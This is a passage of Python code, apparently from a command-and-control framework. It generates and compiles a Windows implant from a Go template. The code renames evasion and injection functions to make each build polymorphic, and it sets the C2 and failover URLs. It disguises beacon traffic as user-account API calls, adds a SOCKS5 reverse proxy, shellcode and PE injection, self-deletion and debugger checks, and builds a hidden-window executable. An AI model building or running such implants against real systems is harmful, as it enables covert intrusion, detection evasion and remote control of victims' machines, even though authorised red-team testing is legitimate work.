        go_code = go_code.replace('{AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}', agent_check_windows_debugger_func)
        go_code = go_code.replace('{AGENT_SELF_DELETE_FUNC}', agent_self_delete_func)
        go_code = go_code.replace('{AGENT_HIDE_CONSOLE_FUNC}', agent_hide_console_func)
        go_code = go_code.replace('{AGENT_CHECK_WORKING_HOURS_FUNC}', agent_check_working_hours_func)
        go_code = go_code.replace('{AGENT_CHECK_KILL_DATE_FUNC}', agent_check_kill_date_func)
        go_code = go_code.replace('{AGENT_GET_PROCESS_ID_FUNC}', agent_get_process_id_func)
        go_code = go_code.replace('{AGENT_INJECT_SHELLCODE_FUNC}', agent_inject_shellcode_func)
        go_code = go_code.replace('{AGENT_INJECT_PE_FUNC}', agent_inject_pe_func)

        # Replace failover function names
        go_code = go_code.replace('{AGENT_TRY_FAILOVER_FUNC}', agent_try_failover_func)
        go_code = go_code.replace('{AGENT_INCREMENT_FAIL_COUNT_FUNC}', agent_increment_fail_count_func)
        go_code = go_code.replace('{AGENT_RESET_FAIL_COUNT_FUNC}', agent_reset_fail_count_func)

        # Replace failover field names
        go_code = go_code.replace('{AGENT_FAILOVER_URLS_FIELD}', agent_failover_urls_field)
        go_code = go_code.replace('{AGENT_USE_FAILOVER_FIELD}', agent_use_failover_field)
        go_code = go_code.replace('{AGENT_CURRENT_C2_URL_FIELD}', agent_current_c2_url_field)
        go_code = go_code.replace('{AGENT_CURRENT_FAIL_COUNT_FIELD}', agent_current_fail_count_field)
        go_code = go_code.replace('{AGENT_MAX_FAIL_COUNT_FIELD}', agent_max_fail_count_field)
        go_code = go_code.replace('{AGENT_LAST_CONNECTION_ATTEMPT_FIELD}', agent_last_connection_attempt_field)
        go_code = go_code.replace('{AGENT_IN_FAILOVER_ATTEMPT_FIELD}', agent_in_failover_attempt_field)

        # Replace reverse proxy field names
        go_code = go_code.replace('{AGENT_REVERSE_PROXY_ACTIVE_FIELD}', agent_reverse_proxy_active_field)
        go_code = go_code.replace('{AGENT_REVERSE_PROXY_STOP_CHAN_FIELD}', agent_reverse_proxy_stop_chan_field)
        go_code = go_code.replace('{AGENT_REVERSE_PROXY_LOCK_FIELD}', agent_reverse_proxy_lock_field)

        # Replace reverse proxy function names
        go_code = go_code.replace('{AGENT_START_REVERSE_PROXY_FUNC}', agent_start_reverse_proxy_func)
        go_code = go_code.replace('{AGENT_STOP_REVERSE_PROXY_FUNC}', agent_stop_reverse_proxy_func)
        go_code = go_code.replace('{AGENT_HANDLE_SOCKS5_FUNC}', agent_handle_socks5_func)

        # Convert the profile headers dictionary to Go map literal format
        go_headers_parts = []
        for key, value in profile_headers.items():
            escaped_value = value.replace('"', '\\"')
            go_headers_parts.append(f'"{key}": "{escaped_value}"')
        go_headers_literal = "{" + ", ".join(go_headers_parts) + "}"

        # Replace the hardcoded headers in the struct initialization to Opsec Safe profile_config header
        go_code = go_code.replace('map[string]string{"User-Agent": "Go C2 Agent"}', f"map[string]string{go_headers_literal}")

        # Extract endpoints from profile_config to replace hardcoded defaults
        endpoints = profile_config.get('endpoints', {})
        register_uri = endpoints.get('register', '/api/users/register')
        tasks_uri = endpoints.get('tasks', '/api/users/{agent_id}/profile')
        results_uri = endpoints.get('results', '/api/users/{agent_id}/activity')
        interactive_uri = endpoints.get('interactive', '/api/users/{agent_id}/settings')
        interactive_status_uri = endpoints.get('interactive_status', '/api/users/{agent_id}/status')

        # Replace the hardcoded endpoint paths in the struct initialization with profile-defined values
        go_code = go_code.replace('"/api/users/register"', f'"{register_uri}"')
        go_code = go_code.replace('"/api/users/{agent_id}/profile"', f'"{tasks_uri}"')
        go_code = go_code.replace('"/api/users/{agent_id}/activity"', f'"{results_uri}"')
        go_code = go_code.replace('"/api/users/{agent_id}/settings"', f'"{interactive_uri}"')
        go_code = go_code.replace('"/api/users/{agent_id}/status"', f'"{interactive_status_uri}"')

        # Extract kill_date and working_hours from profile_config
        kill_date = profile_config.get('kill_date', '2025-12-31T23:59:59Z')
        working_hours = profile_config.get('working_hours', {
            "start_hour": 9,
            "end_hour": 17,
            "timezone": "UTC",
            "days": [1, 2, 3, 4, 5]
        })

        # Replace remaining simple placeholders
        go_code = go_code.replace('{AGENT_ID}', agent_id)
        go_code = go_code.replace('{SECRET_KEY}', secret_key)
        go_code = go_code.replace('{C2_URL}', c2_url)
        go_code = go_code.replace('{DISABLE_SANDBOX}', 'true' if disable_sandbox else 'false')
        go_code = go_code.replace('{KILL_DATE}', kill_date)
        go_code = go_code.replace('{WORKING_HOURS_START_HOUR}', str(working_hours.get('start_hour', 9)))
        go_code = go_code.replace('{WORKING_HOURS_END_HOUR}', str(working_hours.get('end_hour', 17)))
        go_code = go_code.replace('{WORKING_HOURS_TIMEZONE}', working_hours.get('timezone', 'UTC'))
        days_list = working_hours.get('days', [1, 2, 3, 4, 5])
        days_str = ', '.join(map(str, days_list))
        go_code = go_code.replace('{WORKING_HOURS_DAYS}', days_str)

        # Replace redirector placeholders
        go_code = go_code.replace('{REDIRECTOR_HOST}', redirector_host)
        go_code = go_code.replace('{REDIRECTOR_PORT}', str(redirector_port))
        go_code = go_code.replace('{USE_REDIRECTOR}', 'true' if use_redirector else 'false')

        # Replace failover URLs placeholder
        if use_failover and failover_urls:
            go_failover_urls = ', '.join([f'"{url}"' for url in failover_urls])
            go_code = go_code.replace('{FAILOVER_URLS}', f'[]string{{{go_failover_urls}}}')
            go_code = go_code.replace('{USE_FAILOVER}', 'true')
        else:
            go_code = go_code.replace('{FAILOVER_URLS}', '[]string{}')
            go_code = go_code.replace('{USE_FAILOVER}', 'false')

        logs_dir = 'logs'
        if not os.path.exists(logs_dir):
            os.makedirs(logs_dir)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_listener_name = "go_agent"  # We'll use a generic name since we don't have listener_name here
        exe_filename = f"go_agent_{agent_id[:8]}_{timestamp}.exe"
        final_exe_path = os.path.join(logs_dir, exe_filename)

        with tempfile.TemporaryDirectory() as temp_dir:
            go_file_path = os.path.join(temp_dir, 'agent.go')
            with open(go_file_path, 'w') as f:
                f.write(go_code)

            go_env = os.environ.copy()
            go_env['GOMODCACHE'] = os.path.join(temp_dir, 'modcache')
            go_env['GOCACHE'] = os.path.join(temp_dir, 'gocache')
            go_env['GOPATH'] = os.path.join(temp_dir, 'gopath')

            result = subprocess.run([
                'go', 'mod', 'init', 'agent'
            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)

            if result.returncode != 0:
                raise Exception(f"Failed to initialize Go module: {result.stderr}")

            result = subprocess.run([
                'go', 'get', 'github.com/fernet/fernet-go'
            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)

            if result.returncode != 0:
                raise Exception(f"Failed to get fernet-go dependency: {result.stderr}")

            # Get goffloader dependencies for BOF execution
            result = subprocess.run([
                'go', 'get', 'github.com/praetorian-inc/goffloader/src/coff'
            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)

            if result.returncode != 0:
                raise Exception(f"Failed to get goffloader coff dependency: {result.stderr}")

            result = subprocess.run([
                'go', 'get', 'github.com/praetorian-inc/goffloader/src/lighthouse'
            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)

            if result.returncode != 0:
                raise Exception(f"Failed to get goffloader lighthouse dependency: {result.stderr}")

            # Get go-clr dependency for .NET assembly execution
            result = subprocess.run([
                'go', 'get', 'github.com/Ne0nd0g/go-clr'
            ], capture_output=True, text=True, cwd=temp_dir, env=go_env)

            if result.returncode != 0:
                raise Exception(f"Failed to get go-clr dependency: {result.stderr}")

            output_filename = 'agent.exe'
            temp_exe_path = os.path.join(temp_dir, 'agent.exe')

            try:
                env = go_env.copy()  # Use the same Go cache environment
                env['GOOS'] = 'windows'
                env['GOARCH'] = 'amd64'

                # For Windows builds, use GUI application flag to prevent console window allocation
                ldflags = ['-s', '-w']
                ldflags.extend(['-H', 'windowsgui'])  # Create GUI application without console window

                result = subprocess.run([
                    'go', 'build',
                    '-ldflags', ' '.join(ldflags),
                    '-o', output_filename,
                    '.'
                ], env=env, capture_output=True, text=True, cwd=temp_dir)

                if result.returncode != 0:
                    raise Exception(f"Go compilation failed: {result.stderr}")

                shutil.move(temp_exe_path, final_exe_path)

                print(f"[+] Polymorphic Go agent compiled successfully to: {final_exe_path}")

                return final_exe_path

            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to compile Go agent: {str(e)}")
            except FileNotFoundError:
                raise Exception("Go compiler not found. Please install Go and ensure 'go' command is in PATH.") # See documentation
